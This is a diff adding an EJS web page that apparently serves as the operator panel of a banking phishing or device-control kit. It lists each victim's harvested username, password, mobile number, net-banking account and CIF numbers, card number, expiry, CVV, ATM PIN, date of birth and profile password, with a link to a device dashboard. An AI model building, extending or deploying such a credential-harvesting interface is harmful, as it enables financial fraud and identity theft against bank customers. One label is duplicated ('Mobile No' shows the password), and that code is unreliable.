@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <% if (user) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>Username:</strong> <%= user.username %></p>
+        <p><strong>Mobile No:</strong> <%= user.password %></p>
+        <p><strong>Mobile No:</strong> <%= user.mobileNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+
+      </div>
+    <% } %>
+
+    <% if (netBanking) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>Name:</strong> <%= user.name %></p>
+        <p><strong>Account No:</strong> <%= user.acNumber %></p>
+        <p><strong>CIF No:</strong> <%= user.cifNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+
+      </div>
+    <% } %>
+
+    <% if (card) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>Card NUmber:</strong> <%= user.cardNumber %></p>
+        <p><strong>ExpiryMonth:</strong> <%= user.expiryMonth %></p>
+        <p><strong>expiryYear:</strong> <%= user.expiryYear %></p>
+        <p><strong>cvv:</strong> <%= user.cvv %></p>
+        <p><strong>atmPin:</strong> <%= user.atmPin %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+
+      </div>
+    <% } %>
+
+    <% if (success) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>DOB:</strong> <%= user.dob %></p>
+        <p><strong>profilePassword:</strong> <%= user.profilePassword %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+
+      </div>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
